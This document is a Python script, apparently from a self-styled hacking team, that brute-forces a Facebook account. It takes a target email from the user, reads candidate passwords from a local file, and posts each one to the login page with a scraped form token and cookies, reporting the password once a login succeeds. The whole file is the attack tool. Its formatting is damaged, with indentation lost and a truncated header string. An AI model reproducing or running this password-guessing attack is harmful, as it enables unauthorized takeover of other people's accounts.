import requests
import threading
# import urllib.request
# import os
from bs4 import BeautifulSoup
import sys
try :
if sys.version_info[ 0 ] < 3 :
raise "MEMBUTUHKAN/REQUIRED PYTHON 3.x"
except Exception as ex:
print ( ''' --------------------------------------
MEMBUTUHKAN/REQUIRED PYTHON 3.x
gunakan/use : python3 fb.py
Send your problems on anon6372098@gmail.com
#Creator : Anon6372098
#Email : anon6372098@gmail.com
#Yt Channel : D4RK SYST3M F41LUR3 S33K3R
#Github : /Anon6372098
#Team : D4RK SYST3M F41LUR3 S33K3R (DSFS)
--------------------------------------
''' )
sys.exit()
post_url = 'https://www.facebook.com/login.php'
headers = {
'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, lik
}
payload = {}
cookie = {}
def create_form ():
form= dict()
cookie= { 'fr' : '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy' }
data= requests.get(post_url, headers = headers)
# print('Form Creating : ',data.url)
# print('Return Status : ',data.status_code)
#for i in data.headers:
# print(i,' : ',data.headers[i])
for i in data.cookies:
cookie[i.name] = i.value
data= BeautifulSoup(data.text, 'html.parser' ).form
if data.input[ 'name' ] =='lsd' :
form[ 'lsd' ] = data.input[ 'value' ]
return (form,cookie)
def function(email,passw,i):
global payload,cookie
if i % 10==1 :
payload,cookie = create_form()
payload[ 'email' ] = email
payload[ 'pass' ] = passw
# print(payload)
# print(cookie)
# print('lsd : ',payload['lsd'])
# print(cookie)
r = requests.post(post_url, data= payload, cookies = cookie, headers = headers)
if 'Find Friends' in r.text:
print ( 'password is ' ,passw)
#open('d.html','w').write(r.text)
return True
return False
#payload=create_form()
print ( '___________________________________________________________________________\n' )
file= open( 'passwords.txt' , 'r' )
i = 0
email = input ( 'Masukkan/Enter Email : ' )
print ( "" )
print ( "Target Email ID : " ,email)
print ( "" )
while file:
passw = file.readline().strip()
i += 1
print ( "Trying Password " + str (i) + ": " ,passw)
if function(email,passw,i):
break
# threading.Thread(target=function,args=(email,passw,i)).start()
# if not i%10:
# os.system('pause')
